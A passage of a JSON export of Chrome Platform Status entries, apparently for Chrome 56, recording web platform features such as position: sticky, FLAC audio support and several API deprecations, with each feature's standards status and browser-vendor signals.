    "id": 5680800376815616,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:52.170150",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP: SecurityPolicyViolationEvent for Workers.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec-csp/#violation-events",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/665356",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When a Worker's CSP is violated, we should fire a 'SecurityPolicyViolation' event at its global object.",
    "id": 5679844478156800,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:41.920770",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS border-image-repeat: space support",
    "tags": [
      "border-image-repeat space css borders"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://www.w3.org/TR/css3-background/#the-border-image-repeat",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/50",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "cavalcantii@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=584916",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/dn337001(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_9_1.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Previously, \"space\" was implemented the same as \"repeat\".",
    "id": 5520773385027584,
    "resources": {
      "samples": [
        "http://codepen.io/Savago/pen/XjvwjZ"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-11-22 18:03:34.611450",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS position: sticky",
    "comments": "Removed in Blink http://src.chromium.org/viewvc/blink?view=revision&revision=177128 in Chrome 23. A new implementation has been enabled in 56.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/css-position/#valdef-position-sticky",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=886646",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "flackr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=231752",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://dev.modern.ie/platform/status/positionsticky/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "position: sticky is a new way to position elements and is conceptually similar to position: fixed. The difference is that a stickily positioned element behaves like position: relative within its parent, until a given offset threshold is met.",
    "id": 6190250464378880,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/position#Sticky_positioning"
      ],
      "samples": [
        "https://ebidel.github.io/demos/sticky-position-event.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:13.742150",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS: New names for motion path properties",
    "tags": [
      "Motion Path"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.fxtf.org/motion-1/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "ericwilligers@chromium.org",
          "shans@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=645840",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Motion paths allow authors to animate any graphical object along an author-specified path.\r\n\r\nThe CSS properties are being named: offset-path offset-distance offset-rotate.\r\n\r\n\r\n\r\nFrom Chrome 55, offset-path and offset-distance are supported. offset-rotate will become available in Chrome 56.\r\n",
    "id": 6390764217040896,
    "resources": {
      "samples": [
        "http://goo.gl/WjA4lQ"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:32.389450",
      "by": "ericbidelman@google.com"
    },
    "name": "CSSConditionRule interface",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-conditional/#the-cssconditionrule-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "xing.xu@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/651792",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSSConditionRule interface inherits from CSSGroupingRule. CSSMediaRule and CSSSupportsRule both inherit from CSSConditionRule. Before the introduction of CSSConditionRule in Blink, CSSMediaRule inherited from CSSGroupingRule, while CSSSupportsRule inherited from CSSRule and duplicated the members of CSSGroupingRule.",
    "id": 4867173717639168,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CSSConditionRule"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:26.676310",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate SVGSVGElement.currentView/useCurrentView and SVGViewSpec interface",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://svgwg.org/svg2-draft/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=629445",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "SVGSVGElement.currentView/useCurrentView and SVGViewSpec interface are removed from SVG2.0 spec.\r\n\r\nThis was deprecated in Chrome 54.",
    "id": 4511711998509056,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:05.615590",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate `reflected-xss` CSP directive.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-csp/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "SecurityFeature"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=657737",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Early drafts of CSP2 contained a `reflected-xss` directive, which is little more than syntactic sugar for the `X-XSS-Protection` header. It offered no additional functionality beyond that header, just a better syntax. I shipped our implementation as part of shipping CSP2 (https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/wToP6b04zVE/imuPatGy3awJ). I should have undone that in 2015 when we dropped the directive from the CR draft. I'd like to undo it now.",
    "id": 5769374145183744,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:04.530950",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate all fetches for scripts with invalid type/language attributes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "csharrison@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>Loader"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=626321",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Right now, the preload scanner will send fetches for script tags regardless of type/language, but the script will not execute when parsed. Often, sites will use these custom tags combined with XHR, resulting in double downloads. By deprecating the fetch, the preload scanner and the parser will have the same semantics, and we will not be initiating fetches for scripts we will not execute. \r\n\r\nTo work around this issue and maintain the fetch, sites should use link preload.",
    "id": 5760718284521472,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/eu57SCNltls",
        "https://html.spec.whatwg.org/multipage/scripting.html#prepare-a-script"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:49.720610",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and Remove SVGViewElement.viewTarget attribute ",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://svgwg.org/svg2-draft/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 56
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=633908",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "As per SVG2.0, SVGViewElement.viewTarget is removed\r\n\r\nhttps://github.com/w3c/svgwg/commit/c1690ae1b99aa95c648a304ec7a8f7dec46d7c83\r\n",
    "id": 5665473114931200,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:30.964910",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove MediaStreamTrack.getSources()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/mediacapture-main/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "guidou@chromium.org",
          "hta@chromium.org",
          "blum@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/388194",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove support for the MediaStreamTrack.getSources() method. \r\nThis method was removed from the spec in favor of MediaDevices.enumerateDevices().\r\n\r\nThis was deprecated in Chrome 40.",
    "id": 4765305641369600,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:36.009450",
      "by": "ericbidelman@google.com"
    },
    "name": "Dispatch synthetic events (at least until its root) when target and relatedTarget are identical",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dom.spec.whatwg.org/#dispatching-events",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=655494",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Spec: DOM Standard: https://dom.spec.whatwg.org/#dispatching-events\r\nWPT Update: https://github.com/w3c/web-platform-tests/pull/3865\r\n\r\nSo far, Blink does not dispatch synthetic events if all of the following conditions are satisfied:\r\n1) event's target is in a shadow tree\r\n2) event has relatedTarget\r\n3) event's target and event's relatedTarget are identical\r\n\r\nThe new behavior will dispatch synthetic events even if the all conditions are satisfied.\r\n\r\n\r\n",
    "id": 5108117087977472,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:02.424040",
      "by": "ericbidelman@google.com"
    },
    "name": "FLAC codec support for <audio> and WebAudio.",
    "tags": [
      "FLAC",
      "audio",
      "WebAudio"
    ],
    "comments": "Chrome for Android and WebView have on-again, off-again supported the FLAC codec only in the FLAC container with <audio> for a constrained set of configurations since Android 3.1 [1]. As of M56, all configurations of FLAC are supported on Android Chrome and WebView. Note: FLAC is not yet supported through Media Source Extensions (MSE) [2].\r\n\r\n[1] https://developer.android.com/guide/appendix/media-formats.html\r\n[2] See http://crbug.com/666000.\r\n\r\n",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://xiph.org/flac/format.html",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/HTML/Supported_media_formats#FLAC",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "dalecurtis@chromium.org",
          "servolk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Internals>Media"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=93887",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/15601752-support-flac",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enables support for the FLAC audio codec within the FLAC and Ogg containers for the HTML5 <audio> tag and WebAudio's decodeAudioData() API.",
    "id": 5744731434778624,
    "resources": {
      "docs": [
        "https://en.wikipedia.org/wiki/FLAC",
        "https://xiph.org/flac/ogg_mapping.html",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioContext/decodeAudioData"
      ],
      "samples": [
        "http://hpr.dogphilosophy.net/test/"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-08-07 16:41:36.150590",
      "by": "ericbidelman@google.com"
    },
    "name": "Fire VisibilityChange event on document unloading",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://w3c.github.io/page-visibility/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "kinuko@chromium.org",
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=594049",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/page-visibility/issues/18#issuecomment-156031906",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "visibilitychange event should fire as part of unload process and document.visibilityState should report 'hidden'.",
    "id": 5758579827015680,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:11.061760",
      "by": "ericbidelman@google.com"
    },
    "name": "Fractional coordinates in MouseEvents",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/cssom-view/#extensions-to-the-mouseevent-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/pointerevents/issues/107#issuecomment-232939986",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "mustaq@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/660057",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/pointerevents/issues/107#issuecomment-232811900",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Update the types of all coordinates in MouseEvents from long to double to make the coordinates more precise for PointerEvents on high-DPI devices.\r\n\r\nNote, however, that the only browser-fired events that will change are PointerEvents. MouseEvents will continue to have integral coordinates for backward compatibility.",
    "id": 6169687914184704,
    "resources": {
      "samples": [
        "https://output.jsbin.com/quqoqe/4/quiet"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:12.352000",
      "by": "ericbidelman@google.com"
    },
    "name": "Inert URL Bar",
    "tags": [
      "url bar",
      "top controls",
      "layout",
      "resize",
      "vh"
    ],
    "comments": "While Firefox hasn't expressed any explicit signal, engineers weren't opposed. Filed https://bugzilla.mozilla.org/show_bug.cgi?id=1314686 for Firefox to match Safari and Chrome as well.\r\n\r\nEdge doesn't use a moving URL bar so this doesn't apply there.",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "bokan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/428132",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Hiding and Showing the URL bar will no longer resize the initial containing block or elements sized with vh units. This matches iOS Safari.",
    "id": 6241601772847104,
    "resources": {
      "docs": [
        "https://github.com/bokand/URLBarSizing"
      ],
      "samples": [
        "http://bokand.github.io/demo/urlbarsize.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:55.368200",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Scroll Anchoring",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/ScrollAnchoring/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/WICG/interventions/issues/2#issuecomment-178981012",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 56
        },
        "owners": [
          "skobes@chromium.org",
          "ymalik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=558575",
        "intervention": true
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=171099",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Scroll anchoring adjusts the scroll position to prevent visible jumps (or \"reflows\") when content changes above the viewport.\r\n\r\nScroll anchoring introduces CSS \"overflow-anchor\" as an opt-out for developers.",
    "id": 5700102471548928,
    "resources": {
      "docs": [
        "https://github.com/WICG/ScrollAnchoring/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:16.122670",
      "by": "ericbidelman@google.com"
    },
    "name": "KeyboardEvent.isComposing",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/uievents/#dom-keyboardevent-iscomposing",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/isComposing",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/625686",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows an app to determine if there is an active composition outstanding for keyboard events being generated without monitoring composition events directly.\r\n\r\n",
    "id": 6598894867709952,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/isComposing"
      ],
      "samples": [
        "https://cdn.rawgit.com/w3c/uievents/gh-pages/tools/key-event-viewer.html"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-12-13 21:53:52.266280",
      "by": "jmedley@google.com"
    },
    "name": "Link rel=prefetch header support",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/resource-hints/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>Loader"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/658274",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The proposed change will add support for the \"prefetch\" rel value in Link headers, enabling easy addition of such resource hints and therefore easier hinting of resources needed for next navigation.",
    "id": 5383221353119744,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-11-24 10:00:32.555380",
      "by": "fbeaufort@google.com"
    },
    "name": "Media preload over cellular connections",
    "comments": "media, preload",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#attr-media-preload",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
